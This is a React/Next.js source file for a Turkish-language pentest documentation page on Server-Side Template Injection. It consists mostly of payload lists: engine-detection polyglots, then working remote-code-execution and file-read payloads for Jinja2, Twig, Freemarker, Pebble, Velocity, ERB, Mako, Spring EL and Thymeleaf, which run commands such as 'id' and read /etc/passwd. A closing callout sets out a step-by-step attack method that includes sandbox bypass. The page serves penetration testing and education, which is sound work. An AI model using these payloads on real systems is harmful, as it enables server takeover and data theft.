"use client"

import { motion } from "framer-motion"
import { Database, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "detection", title: "Detection / Polyglot", level: 2 },
  { id: "jinja2", title: "Jinja2 (Python)", level: 2 },
  { id: "twig", title: "Twig (PHP)", level: 2 },
  { id: "freemarker", title: "Freemarker (Java)", level: 2 },
  { id: "other-engines", title: "Other Engines", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function SSTIPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-yellow-400 text-sm font-medium mb-4">
            <Database className="w-4 h-4" />
            <span>Injection Zafiyetleri</span>
          </div>
          <h1 className="text-4xl font-bold text-foreground mb-4">Template Injection (SSTI)</h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            Server-Side Template Injection - template engine&apos;lere kötü amaçlı kod enjekte edilmesi.
            RCE, dosya okuma ve sandbox escape. Jinja2, Twig, Freemarker, Pebble, Velocity hedef alınır.
          </p>
        </motion.div>

        <Callout type="warning" title="Kritik">
          SSTI genelde doğrudan RCE&apos;ye yol açar. Template engine tespit edildikten sonra
          uygun gadget chain kullanılır.
        </Callout>

        <motion.section variants={fadeIn} id="detection" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            Detection / Polyglot
          </h2>
          <p className="text-muted-foreground mb-4">
            Hangi template engine kullanıldığını belirlemek için polyglot payload&apos;lar kullanın.
            Matematiksel ifadeler ile injection tespit edilir.
          </p>
          <PayloadList
            title="Detection Payloads"
            initialShow={10}
            payloads={[
              { code: `{{7*7}}`, note: "49 dönerse → Jinja2, Twig, vb." },
              { code: "$" + "{7*7}", note: "49 dönerse → Freemarker, Mako, vb." },
              { code: `<%= 7*7 %>`, note: "49 dönerse → ERB (Ruby)" },
              { code: `#{7*7}`, note: "49 dönerse → Ruby, Slim" },
              { code: `{{7*'7'}}`, note: "7777777 → Jinja2, 49 → Twig" },
              { code: `*{7*7}`, note: "49 dönerse → Thymeleaf" },
              { code: `@(7*7)`, note: "49 dönerse → Razor (.NET)" },
              { code: "${{7*7}}", note: "49 dönerse → Pebble" },
              { code: `#set($x=7*7)$x`, note: "49 dönerse → Velocity" },
              { code: `{{config}}`, note: "Config dump → Jinja2" },
              { code: `{{self}}`, note: "Self object → Jinja2" },
              { code: `{{dump(app)}}`, note: "App dump → Twig" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="jinja2" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            Jinja2 (Python)
          </h2>
          <PayloadList
            title="Jinja2 RCE Payloads"
            initialShow={8}
            payloads={[
              { code: `{{config.items()}}`, note: "Config dump" },
              { code: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`, note: "RCE via request" },
              { code: `{{''.__class__.__mro__[1].__subclasses__()}}`, note: "Subclass enumeration" },
              { code: `{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}`, note: "Popen via subclass" },
              { code: `{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}`, note: "Warning class chain" },
              { code: `{{lipsum.__globals__['os'].popen('id').read()}}`, note: "lipsum global access" },
              { code: `{{cycler.__init__.__globals__.os.popen('id').read()}}`, note: "cycler chain" },
              { code: `{{joiner.__init__.__globals__.os.popen('id').read()}}`, note: "joiner chain" },
              { code: `{{namespace.__init__.__globals__.os.popen('id').read()}}`, note: "namespace chain" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="twig" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            Twig (PHP)
          </h2>
          <PayloadList
            title="Twig RCE Payloads"
            initialShow={6}
            payloads={[
              { code: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`, note: "Twig < 1.20 RCE" },
              { code: `{{['id']|filter('system')}}`, note: "Twig 3.x RCE" },
              { code: `{{['cat /etc/passwd']|filter('exec')}}`, note: "exec filter" },
              { code: `{{app.request.server.all|join(',')}}`, note: "Server info dump" },
              { code: `{{'id'|passthru}}`, note: "passthru filter (bazı versiyonlar)" },
              { code: `{{'/etc/passwd'|file_excerpt(0,100)}}`, note: "File read" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="freemarker" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            Freemarker (Java)
          </h2>
          <PayloadList
            title="Freemarker RCE Payloads"
            initialShow={6}
            payloads={[
              { code: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', note: "Execute class" },
              { code: '${"freemarker.template.utility.Execute"?new()("id")}', note: "Shorthand RCE" },
              { code: '<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}', note: "ProcessBuilder" },
              { code: '[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}', note: "Alternate syntax" },
              { code: '${"freemarker.template.utility.JythonRuntime"?new()("import os;os.system(\'id\')")}', note: "Jython runtime" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="other-engines" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-orange-500/10 text-orange-400 text-sm font-mono">05</span>
            Other Engines
          </h2>
          <PayloadList
            title="Pebble / Velocity / ERB / Mako"
            initialShow={8}
            payloads={[
              { code: `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}{{bytes}}`, note: "Pebble RCE" },
              { code: `#set($cmd='id')#set($rt=$x.class.forName('java.lang.Runtime'))#set($proc=$rt.getRuntime().exec($cmd))`, note: "Velocity RCE" },
              { code: `<%= system('id') %>`, note: "ERB RCE (Ruby)" },
              { code: `<%= \`id\` %>`, note: "ERB backtick RCE" },
              { code: `<%= IO.popen('id').readlines() %>`, note: "ERB IO.popen" },
              { code: "<%import os%>${os.popen('id').read()}", note: "Mako RCE (Python)" },
              { code: "${T(java.lang.Runtime).getRuntime().exec('id')}", note: "Spring EL injection" },
              { code: `*{T(java.lang.Runtime).getRuntime().exec('id')}`, note: "Thymeleaf SSTI" },
            ]}
          />
        </motion.section>

        <Callout type="tip" title="Test Metodolojisi">
          {"1. {{7*7}} ve ${7*7} ile injection tespit edin\n2. {{7*'7'}} ile engine'i ayırt edin (Jinja2 vs Twig)\n3. Error mesajlarından engine/framework belirleyin\n4. Engine'e uygun RCE chain kullanın\n5. Sandbox varsa bypass teknikleri deneyin"}
        </Callout>

        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs/injection/nosql"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              <ArrowLeft className="w-4 h-4" />
              NoSQL Injection
            </Link>
            <Link
              href="/docs/injection/header"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              Header Injection
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
